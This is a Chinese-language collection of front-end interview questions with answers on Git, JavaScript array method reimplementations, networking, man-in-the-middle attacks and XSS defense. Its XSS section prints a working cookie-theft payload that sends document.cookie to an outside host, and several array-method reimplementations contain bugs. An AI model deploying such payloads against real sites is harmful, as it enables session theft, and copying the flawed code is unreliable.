## 每日一题[（生活一题）](./life.md):books:

[**《小皮咖 · 每日一文》**](./article.md)

[3 月至 5 月《每日一题》](./3-5.md)

在这里记录着每天自己遇到的一道印象深刻的前端问题，以及一道生活中随处可见的小问题。

强迫自己形成积累的习惯，鞭挞自己不断前行，共同学习。

### **2019/07/08 - 2019/07/14** :watch:

---

- Git 如何打标签和切换标签？

  <details>
  <summary>点击</summary>

  ```js
  // 附注标签
  git tag -a v1.1.0 -m 'v1.1.0 release'

  // 本地推送到远程
  git push origin <tag name>  // 推送一个标签到远程

  git push origin --tags   // 推送全部未推送的本地标签

  // 本地删除标签
  git tag -d <tag name>

  // 远程删除标签
  git push origin :refs/tags/<tag name>   // 本地tag删除了，在执行该句，删除远程tag
  ```

  </details>

- decodeURI 与 decodeURIComponent 区别 ?

  <details>
  <summary>点击</summary>

  encodeURI()和 encodeURIComponent()方法可以对 URI 进行编码，以便发送给浏览器。有效的 URI 中不能包含某些字符，例如空格。而这 URI 编码方法就可以对 URI 进行编码，它们用特殊的 UTF-8 编码替换所有无效的字 符，从而让浏览器能够接受和理解。

  它们的主要区别在于，encodeURI() 不会对本身属于 URI 的特殊字符进行编码，例如冒号、正斜杠、问号和井字号；而 encodeURIComponent() 则会对它发现的任何非标准字符进行编码。
  </detail>

* 取整有几种方式？

  <details>
  <summary>点击</summary>

  ```JS
  var a = ~~2.33 // ~是按位非，就是每一位取反，~~常用来取整

  var b= 2.33 | 0 // 或运算

  var c= 2.33 >> 0

  ```

  </details>

### **2019/07/01 - 2019/07/07** :watch:

---

- 什么是临时性死区？

- 如何使用 javascript 实现枚举？

  <details>
  <summary>点击</summary>

  ```js
  // 可以 Object.freeze 来实现枚举,枚举对象的属性不会被改变
  var DaysEnum = Object.freeze({
    monday: 1,
    tuesday: 2,
    wednesday: 3,
  });
  ```

  </details>

- 去除 webpack 开启 dev 服务时的日志打印？

  webpack dev 配置中添加属性 `stats: 'errors-only'`

- 如何获取 iframe 中的 cookie ?

- 如何跳出 forEach 循环？

  <details>
  <summary>点击</summary>

  首先，看一段代码

  ```js
  var a = [1, 2, 3, 4, 5];
  a.forEach(item => {
    console.log(item); //输出：1,2
    if (item === 2) {
      //todo 想办法跳出循环
    }
  });
  ```

  此时，使用 break 或者 return 并不能跳出循环，为何？foreach 编译后代码如下：

  ```js
  const arr = [1, 2, 3, 4, 5];
  for (let i = 0; i < arr.length; i++) {
    const rs = (function(item) {
      console.log(item);
      if (item > 2) return false;
    })(arr[i]);
  }
  // 因此无法跳出循环
  ```

  1. 抛出一个错误可以结束 forEach 循环

  ```js
  try {
    [1, 2, 3, 4, 5].forEach(function(item) {
      if (item === 2) throw item;
      console.log(item);
    });
  } catch (e) {}
  ```

  2. 使用 splice 或 array.length

  已删除的项不会被遍历到。如果已访问的元素在迭代时被删除，之后的元素将被跳过。因此我们可以用 length 或 splice 来修改数组

  ```js
  var arr = [1, 2, 3, 4, 5];
  arr.forEach((item, index) => {
    console.log(item);
    if (item === 2) {
      arr.length = index;
    }
  });
  ```

  直接修改数组的 length, 原数组便发生了更改，有时候我们并不要这种更改，因此我们可以使用一个小技巧，即将数组从 0 开始截断，然后重新赋值给数组也就是 array=array.splice(0)

  ```js
  var arr = [1, 2, 3, 4, 5];
  arr.forEach((item, index) => {
    console.log(item);
    if (item === 2) {
      arr = arr.splice(0);
    }
  });
  // 数组被清空后又将删除的元素数组赋值给原数组，因此原数组没有变化且跳出了循环
  ```

  </details>

- IP 地址和 Mac 地址有什么区别？

  <details>
  <summary>点击</summary>

  IP 地址是逻辑上的，用户可以修改自己设备的 IP 地址，Mac 地址是物理上的，直接烧入物理设备，比如路由器，用户不能轻易修改。

  IP 地址负责标记发送方和接收方，而 MAC 地址负责传输过程中的分段传送，二者缺一不可。

  </details>

* UDP 和 TCP 相比有何不同？

  <details>
  <summary>点击</summary>

  UDP 是一个简单的传输层协议。和 TCP 相比，UDP 有下面几个显著特性：

  - UDP 缺乏可靠性。UDP 本身不提供确认，序列号，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序。即 UDP 不保证数据报会到达其最终目的地，也不保证各个数据报的先后顺序，也不保证每个数据报只到达一次
  - UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。
  - UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。UDP 发送数据报之前也不需要经过握手创建连接的过程。
  - UDP 支持多播和广播。

  </details>

### **2019/06/24 - 2019/06/30** :watch:

---

- 什么是中间人攻击？

  <details>
  <summary>点击</summary>

  所谓中间人攻击，指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。

  1. **SSL 剥离**

  SSL 剥离即阻止用户使用 HTTPS 访问网站。由于并不是所有网站都只支持 HTTPS，大部分网站会同时支持 HTTP 和 HTTPS 两种协议。用户在访问网站时，也可能会在地址栏中输入 http:// 的地址，第一次的访问完全是明文的，这就给了攻击者可乘之机。通过攻击 DNS 响应，攻击者可以将自己变成中间人。

  **解决方法：**

  为了防止上面说的这种情况，一种叫做 HSTS 的技术被引入了。HSTS（HTTP Strict Transport Security）是用于强制浏览器使用 HTTPS 访问网站的一种机制。它的基本机制是在服务器返回的响应中，加上一个特殊的头部，指示浏览器对于此网站，强制使用 HTTPS 进行访问

  2. **伪造证书攻击**

  HSTS 只解决了 SSL 剥离的问题，然而即使在全程使用 HTTPS 的情况下，我们仍然有可能被监听。

  假设我们想访问 www.google.com，但我们的 DNS 服务器被攻击了，指向的 IP 地址并非 Google 的服务器，而是攻击者的 IP。当攻击者的服务器也有合法的证书的时候，我们的浏览器就会认为对方是 Google 服务器，从而信任对方。这样，攻击者便可以监听我们和谷歌之前的所有通信了。

  可以看到攻击者有两步需要操作，第一步是需要攻击 DNS 服务器。第二步是攻击者自己的证书需要被用户信任，这一步对于用户来说是很难控制的，需要证书颁发机构能够控制自己不滥发证书。

  **解决方法：**

  HPKP 技术是为了解决伪造证书攻击而诞生的。

  HPKP（Public Key Pinning Extension for HTTP）在 HSTS 上更进一步，HPKP 直接在返回头中存储服务器的公钥指纹信息，一旦发现指纹和实际接受到的公钥有差异，浏览器就可以认为正在被攻击

  </details>

- 实现数组 sort 方法 ?

  <details>
  <summary>点击</summary>

  设要排序的元素个数是 n：

  - 当 n <= 10 时，采用插入排序
  - 当 n > 10 时，采用三路快速排序

    - 10 < n <= 1000, 采用中位数作为哨兵元素
    - n > 1000, 每隔 200~215 个元素挑出一个元素，放到一个新数组，然后对它排序，找到中间位置的数，以此作为中位数

  ```js
  const sort = (arr, comparefn) => {
    let array = Object(arr);
    let length = array.length >>> 0;
    return InnerArraySort(array, length, comparefn);
  };

  const InnerArraySort = (array, length, comparefn) => {
    // 比较函数未传入
    if (Object.prototype.toString.call(comparefn) !== '[object Function]') {
      comparefn = function(x, y) {
        if (x === y) return 0;
        x = x.toString();
        y = y.toString();
        if (x == y) return 0;
        else return x < y ? -1 : 1;
      };
    }
    // 插入排序
    const insertSort = (arr, start = 0, end) => {
      end = end || arr.length;
      for (let i = start; i < end; i++) {
        let e = arr[i];
        let j;
        for (j = i; j > start && comparefn(arr[j - 1], e) > 0; j--)
          arr[j] = arr[j - 1];
        arr[j] = e;
      }
      return;
    };
    const getThirdIndex = (a, from, to) => {
      let tmpArr = [];
      // 递增量，200~215 之间，因为任何正数和15做与操作，不会超过15，当然是大于0的
      let increment = 200 + ((to - from) & 15);
      let j = 0;
      from += 1;
      to -= 1;
      for (let i = from; i < to; i += increment) {
        tmpArr[j] = [i, a[i]];
        j++;
      }
      // 把临时数组排序，取中间的值，确保哨兵的值接近平均位置
      tmpArr.sort(function(a, b) {
        return comparefn(a[1], b[1]);
      });
      let thirdIndex = tmpArr[tmpArr.length >> 1][0];
      return thirdIndex;
    };

    const _sort = (a, b, c) => {
      let arr = [];
      arr.push(a, b, c);
      insertSort(arr, 0, 3);
      return arr;
    };

    const quickSort = (a, from, to) => {
      //哨兵位置
      let thirdIndex = 0;
      while (true) {
        if (to - from <= 10) {
          // 长度小于10，插入排序
          insertSort(a, from, to);
          return;
        }
        if (to - from > 1000) {
          // 把临时数组排序，取中间的值，确保哨兵的值接近平均位置
          thirdIndex = getThirdIndex(a, from, to);
        } else {
          // 小于1000 直接取中点
          thirdIndex = from + ((to - from) >> 2);
        }
        // 使用插入排序对比起点，哨兵位置，终点，返回数组
        let tmpArr = _sort(a[from], a[thirdIndex], a[to - 1]);
        a[from] = tmpArr[0];
        a[thirdIndex] = tmpArr[1];
        a[to - 1] = tmpArr[2];

        // 现在正式把 thirdIndex 作为哨兵
        let pivot = a[thirdIndex];
        [a[from], a[thirdIndex]] = [a[thirdIndex], a[from]];
        // 正式进入快排
        let lowEnd = from + 1;
        let highStart = to - 1;
        a[thirdIndex] = a[lowEnd];
        a[lowEnd] = pivot;
        // [lowEnd, i)的元素是和pivot相等的
        // [i, highStart) 的元素是需要处理的
        for (let i = lowEnd + 1; i < highStart; i++) {
          let element = a[i];
          let order = comparefn(element, pivot);
          if (order < 0) {
            a[i] = a[lowEnd];
            a[lowEnd] = element;
            lowEnd++;
          } else if (order > 0) {
            do {
              highStart--;
              if (highStart === i) break;
              order = comparefn(a[highStart], pivot);
            } while (order > 0);
            // 现在 a[highStart] <= pivot
            // a[i] > pivot
            // 两者交换
            a[i] = a[highStart];
            a[highStart] = element;
            if (order < 0) {
              // a[i] 和 a[lowEnd] 交换
              element = a[i];
              a[i] = a[lowEnd];
              a[lowEnd] = element;
              lowEnd++;
            }
          }
        }
        // 永远切分大区间
        if (lowEnd - from > to - highStart) {
          // 单独处理小区间
          quickSort(a, highStart, to);
          // 继续切分lowEnd ~ from 这个区间
          to = lowEnd;
        } else if (lowEnd - from <= to - highStart) {
          quickSort(a, from, lowEnd);
          from = highStart;
        }
      }
    };
    quickSort(array, 0, length);
  };

  Array.prototype.sort = comparefn => {
    let array = Object(this);
    let length = array.length >>> 0;
    return InnerArraySort(array, length, comparefn);
  };
  ```

  </details>

- 实现数组 splice 方法 ?

  <details>
  <summary>点击</summary>

  splice 可以说是最受欢迎的数组方法之一，api 灵活，使用方便。现在来梳理一下用法:

  1. splice(position, count) 表示从 position 索引的位置开始，删除 count 个元素

  2. splice(position, 0, ele1, ele2, ...) 表示从 position 索引的元素后面插入一系列的元素

  3. splice(postion, count, ele1, ele2, ...) 表示从 position 索引的位置开始，删除 count 个元素，然后再插入一系列的元素

  4. 返回值为被删除元素组成的数组。

  ```js
  const sliceDeleteElements = (array, startIndex, deleteCount, deleteArr) => {
    for (let i = 0; i < deleteCount; i++) {
      let index = startIndex + i;
      if (index in array) {
        let current = array[index];
        deleteArr[i] = current;
      }
    }
  };

  const movePostElements = (
    array,
    startIndex,
    len,
    deleteCount,
    addElements
  ) => {
    // 如果添加的元素和删除的元素个数相等，相当于元素的替换，数组长度不变，被删除元素后面的元素不需要挪动
    if (deleteCount === addElements.length) return;
    // 如果添加的元素和删除的元素个数不相等，则移动后面的元素
    else if (deleteCount > addElements.length) {
      // 删除的元素比新增的元素多，那么后面的元素整体向前挪动
      // 一共需要挪动 len - startIndex - deleteCount 个元素
      for (let i = startIndex + deleteCount; i < len; i++) {
        let fromIndex = i;
        // 将要挪动到的目标位置
        let toIndex = i - (deleteCount - addElements.length);
        if (fromIndex in array) {
          array[toIndex] = array[fromIndex];
        } else {
          delete array[toIndex];
        }
      }
      // 注意注意！这里我们把后面的元素向前挪，相当于数组长度减小了，需要删除冗余元素
      // 目前长度为 len + addElements - deleteCount
      for (let i = len - 1; i >= len + addElements.length - deleteCount; i--) {
        delete array[i];
      }
    } else if (deleteCount < addElements.length) {
      // 删除的元素比新增的元素少，那么后面的元素整体向后挪动
      // 思考一下: 这里为什么要从后往前遍历？从前往后会产生什么问题？
      for (let i = len - 1; i >= startIndex + deleteCount; i--) {
        let fromIndex = i;
        // 将要挪动到的目标位置
        let toIndex = i + (addElements.length - deleteCount);
        if (fromIndex in array) {
          array[toIndex] = array[fromIndex];
        } else {
          delete array[toIndex];
        }
      }
    }
  };

  const computeStartIndex = (startIndex, len) => {
    // 处理索引负数的情况
    if (startIndex < 0) {
      return startIndex + len > 0 ? startIndex + len : 0;
    }
    return startIndex >= len ? len : startIndex;
  };

  const computeDeleteCount = (startIndex, len, deleteCount, argumentsLen) => {
    // 删除数目没有传，默认删除startIndex及后面所有的
    if (argumentsLen === 1) return len - startIndex;
    // 删除数目过小
    if (deleteCount < 0) return 0;
    // 删除数目过大
    if (deleteCount > len - deleteCount) return len - startIndex;
    return deleteCount;
  };

  Array.prototype.splice = function(startIndex, deleteCount, ...addElements) {
    let argumentsLen = arguments.length;
    let array = Object(this);
    let len = array.length >>> 0;
    let deleteArr = new Array(deleteCount);
    // 处理索引为负数或者超出数组长度的值
    startIndex = computeStartIndex(startIndex, len);
    // 处理索引为过小过大或不存在时的值
    deleteCount = computeDeleteCount(
      startIndex,
      len,
      deleteCount,
      argumentsLen
    );

    // 判断 sealed 对象和 frozen 对象, 即 密封对象 和 冻结对象
    if (Object.isSealed(array) && deleteCount !== addElements.length) {
      throw new TypeError('the object is a sealed object!');
    } else if (
      Object.isFrozen(array) &&
      (deleteCount > 0 || addElements.length > 0)
    ) {
      throw new TypeError('the object is a frozen object!');
    }

    // 拷贝删除的元素，将删除的元素放入deleteArr
    sliceDeleteElements(array, startIndex, deleteCount, deleteArr);
    // 移动删除元素后面的元素
    movePostElements(array, startIndex, len, deleteCount, addElements);

    // 插入新元素
    for (let i = 0; i < addElements.length; i++) {
      array[startIndex + i] = addElements[i];
    }
    // 修改数组长度
    array.length = len - deleteCount + addElements.length;

    return deleteArr;
  };
  ```

  </details>

- 实现数组 filter 方法 ?

  <details>
  <summary>点击</summary>

  ```js
  Array.prototype.filter = function(callbackfn, thisArg) {
    // 处理数组类型异常
    if (this === null || this === undefined) {
      throw new TypeError("Cannot read property 'filter' of null or undefined");
    }
    // 处理回调类型异常
    if (Object.prototype.toString.call(callbackfn) != '[object Function]') {
      throw new TypeError(callbackfn + ' is not a function');
    }
    let O = Object(this);
    let len = O.length >>> 0;
    let resLen = 0;
    let res = [];
    // 判断符合callback为true时，将item赋值进数组
    for (let i = 0; i < len; i++) {
      if (i in O) {
        let element = O[i];
        if (callbackfn.call(thisArg, O[i], i, O)) {
          res[resLen++] = element;
        }
      }
    }
    return res;
  };
  ```

  </details>

- 实现数组 push、pop 方法 ?

  <details>
  <summary>点击</summary>

  ```js
  Array.prototype.push = function(...items) {
    let O = Object(this);
    let len = this.length >>> 0;
    let argCount = items.length >>> 0;
    // 2 ** 53 - 1 为JS能表示的最大正整数
    if (len + argCount > 2 ** 53 - 1) {
      throw new TypeError(
        'The number of array is over the max value restricted!'
      );
    }
    // 最后加一个，然后长度 length + 1
    for (let i = 0; i < argCount; i++) {
      O[len + i] = items[i];
    }
    let newLength = len + argCount;
    O.length = newLength;
    return newLength;
  };

  Array.prototype.pop = function() {
    let O = Object(this);
    let len = this.length >>> 0;
    if (len === 0) {
      O.length = 0;
      return undefined;
    }
    // 使用object的delete删除最后一个，并且length - 1
    len--;
    let value = O[len];
    delete O[len];
    O.length = len;
    return value;
  };
  ```

  </details>

* 实现数组 reduce 方法 ?

  <details>
  <summary>点击</summary>

  ```js
  Array.prototype.reduce = function(callbackfn, initialValue) {
    // 异常处理，和 map 一样
    // 处理数组类型异常
    if (this === null || this === undefined) {
      throw new TypeError("Cannot read property 'reduce' of null or undefined");
    }
    // 处理回调类型异常
    if (Object.prototype.toString.call(callbackfn) != '[object Function]') {
      throw new TypeError(callbackfn + ' is not a function');
    }
    let O = Object(this);
    let len = O.length >>> 0;
    let k = 0;
    let accumulator = initialValue;
    if (accumulator === undefined) {
      for (; k < len; k++) {
        // 查找原型链
        if (k in O) {
          accumulator = O[k];
          k++;
          break;
        }
      }
      // 循环结束还没退出，就表示数组全为空
      throw new Error('Each element of the array is empty');
    }
    for (; k < len; k++) {
      if (k in O) {
        // 注意，核心！
        accumulator = callbackfn.call(undefined, accumulator, O[k], O);
      }
    }
    return accumulator;
  };
  ```

  </details>

* 实现数组 map 方法？

  <details>
  <summary>点击</summary>

  ```js
  Array.prototype.map = function(callback, thisArg) {
    // 处理数组类型异常
    if (this === null || this === undefined) {
      throw new TypeError("Cannot read property 'map' of null or undefined");
    }
    // 处理回调类型异常
    if (Object.prototype.toString.call(callback) != '[object Function]') {
      throw new TypeError(callback + ' is not a function');
    }
    // 先转换为对象
    let obj = Object(this);
    let T = thisArg;
    let len = obj.length >>> 0;
    let arr = new Array(len);
    for (let k = 0; k < len; k++) {
      // in 表示在原型链查找
      // 如果用 hasOwnProperty 是有问题的，它只能找私有属性
      if (k in obj) {
        let kValue = obj[k];
        // 依次传入 this, 当前项，当前索引，整个数组
        let mappedValue = callback.call(T, KValue, k, obj);
        arr[k] = mappedValue;
      }
    }
    return arr;
  };
  ```

  </details>

### **2019/06/17 - 2019/06/23** :watch:

---

- `>>` 和 `>>>` 有什么不一样 ?

  <details>
  <summary>点击</summary>

  `>>>` 是无符号右移，`>>` 是有符号移位

  `>>` 有符号移位：该操作符会将第一个操作数向右移动指定的位数。向右被移出的位被丢弃，拷贝最左侧的位以填充左侧

  ```js
  -9 >> 2;
  // 11111111111111111111111111110111; -> 11111111111111111111111111111101   // -3
  ```

  `>>>` 无符号移位：该操作符会将第一个操作数向右移动指定的位数。向右被移出的位被丢弃，左侧用 0 填充。因为符号位变成了 0，所以结果总是非负的。（即便右移 0 个比特，结果也是非负的。）

  ```js
  9 >>> 2;
  // 00000000000000000000000000001001; ->  00000000000000000000000000000010 // 2
  ```

  </details>

- 给定一个链表，删除链表的倒数第 n 个节点，如何实现?

- 在数组中找出三个数，使得它们的和为 N?

- 如何反转单向链表?

- 谈一谈链表和数组的区别?

  <details>
  <summary>点击</summary>

  **数组的定义**：数据是一种线性表数据结构，它用一组连续的内存空间，来存储一组具有相同类型的数据。

  由于数组在内存中是连续存放的，所以通过下标来随机访问数组中的元素效率是非常高的。但与此同时，为了保证连续性，如果想在数组中添加一个元素，需要大量地对数据进行搬移工作。同理想在数组中删除一个元素也是如此。所以我们得出一个结论：**在数组中随机访问的效率很高，但是执行添加和删除时效率低下，平均时间复杂度为 O(n)**。

  **链表的定义**： 是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。

  刚才介绍了在数组中添加和删除一个元素的效率是低下的。而链表的存储空间是不连续的，使用链表添加或者删除一个数据，我们并不需要为了保持内存的连续性而对数据进行搬移，所以在链表中添加和删除元素是非常高效的。但万事都有两面性，正因为链表的存储空间是不连续的，想要在链表中访问一个元素时，就无法像数组一样根据首地址和下标，通过寻址公式来计算出对应的节点。而只能通过指针去依次遍历找出相应的节点。所以我们得出一个结论：**在链表中执行添加和删除操作时效率很高，而随机访问的效率很低，平均时间复杂度为 O(n)。**

  </details>

- 正则的贪婪模式和混淆模式？

- `getBoundingClientRect()` 的作用？

  用于获取某个元素相对于视窗的位置集合。集合中有**top**, **right**, **bottom**, **left** 等属性。

### **2019/06/10 - 2019/06/16** :watch:

---

- 为什么 **var** 可以重复声明？

  因为编译器会在判断有已经声明的同名变量时忽略 **var**，然后直接赋值

- **requestAnimationFrame** 实现的动画如何清除？

    <details>
    <summary>点击</summary>

  使用 cancelAnimationFrame，如下：

  ```js
  let animate = requestAnimationFrame(animateFunc);

  cancelAnimationFrame(animate);
  ```

    </details>

- **js** 动画为何推荐用 **requestAnimationFrame** 而不用 **setTimeout** ?

    <details>
    <summary>点击</summary>

  **requestAnimationFrame**，顾名思义就是请求动画帧. 以屏幕刷新频率（一般是每秒 60 帧）更新动画，符合人眼的**视觉停留效应**

  #### 为何不用 **setTimeout** ？

  利用 **seTimeout** 实现的动画在某些低端机上会出现卡顿、抖动的现象。 这种现象的产生有两个原因：

  - **setTimeout 的执行时间并不是确定的**。在 Javascript 中， setTimeout 任务被放进了异步队列中，只有当主线程上的任务执行完以后，才会去检查该队列里的任务是否需要开始执行，因此 setTimeout 的实际执行时间一般要比其设定的时间晚一些。

  - **刷新频率受屏幕分辨率和屏幕尺寸的影响**，因此不同设备的屏幕刷新频率可能会不同，而 setTimeout 只能设置一个固定的时间间隔，这个时间不一定和屏幕的刷新时间相同。

  以上两种情况都会导致 setTimeout 的执行步调和屏幕的刷新步调不一致，从而引起丢帧现象。

  **requestAnimationFrame** 还有以下两个优势：

  - **CPU 节能**：使用 setTimeout 实现的动画，当页面被隐藏或最小化时，setTimeout 仍然在后台执行动画任务，由于此时页面处于不可见或不可用状态，刷新动画是没有意义的，完全是浪费 CPU 资源。而 requestAnimationFrame 则完全不同，当页面处理未激活的状态下，该页面的屏幕刷新任务也会被系统暂停，因此跟着系统步伐走的 requestAnimationFrame 也会停止渲染，当页面被激活时，动画就从上次停留的地方继续执行，有效节省了 CPU 开销。

  - **函数节流**：在高频率事件(resize,scroll 等)中，为了防止在一个刷新间隔内发生多次函数执行，使用 requestAnimationFrame 可保证每个刷新间隔内，函数只被执行一次，这样既能保证流畅性，也能更好的节省函数执行的开销。一个刷新间隔内函数执行多次时没有意义的，因为显示器每 16.7ms 刷新一次，多次绘制并不会在屏幕上体现出来。

    </details>

* 如何获取页面某个元素的背景色 **background-color**?

- 首屏渲染白屏的原因可能有哪些？

- 为何要控制 **http** 的请求个数？

  因为在 http1.1 中，不同浏览器对同一域名下的 http 请求的最大并发数量有所限制，请求个数过多影响页面展示

- 淘宝 **flexible** 的原理？

### **2019/06/03 - 2019/06/09** :watch:

---

- 缓存策略？

- 为什么要将 **小图标** 转化为 **base64** ?

- **webpack** 流程是怎样子的？

- **XSS** 攻击如何防止窃取 **cookie** ?

  <details>
  <summary>点击</summary>

  首先讲讲**XSS** 攻击如何窃取 **cookie**？

  ```html
  <!-- js窃取cookie -->
  <script>
    new Image().src =
      'http://jehiah.com/_sandbox/log.cgi?c=' + encodeURI(document.cookie);
  </script>
  <!-- css窃取cookie -->
  <style>
    .getcookies {
      background-image: url('javascript:new Image().src="http://jehiah.com/_sandbox/log.cgi?c=" + encodeURI(document.cookie);');
    }
  </style>
  <p class="getcookies"></p>
  ```

  防止措施：

  不停地重设 session 的重设；将过期时间设置短一些；监控 referrer 与 userAgent 的值；使用 HttpOnly 禁止脚本读取 Cookie。

  </details>

- XSS 攻击会造成怎样的影响 ?

  <details>
  <summary>点击</summary>

  1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号

  2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力

  3、盗窃企业重要的具有商业价值的资料

  4、非法转账

  5、强制发送电子邮件

  6、网站挂马

  7、控制受害者机器向其它网站发起攻击

  </details>

- 如何防止网络攻击？

  参考文章： [《前端网络安全》](https://zxpsuper.github.io/advanced_front_end/book/browser/safe.html)

* 网络攻击有哪些？

  参考文章： [《前端网络安全》](https://zxpsuper.github.io/advanced_front_end/book/browser/safe.html)

![](https://raw.githubusercontent.com/zxpsuper/daily-question/master/image/fork_and_star.jpg)
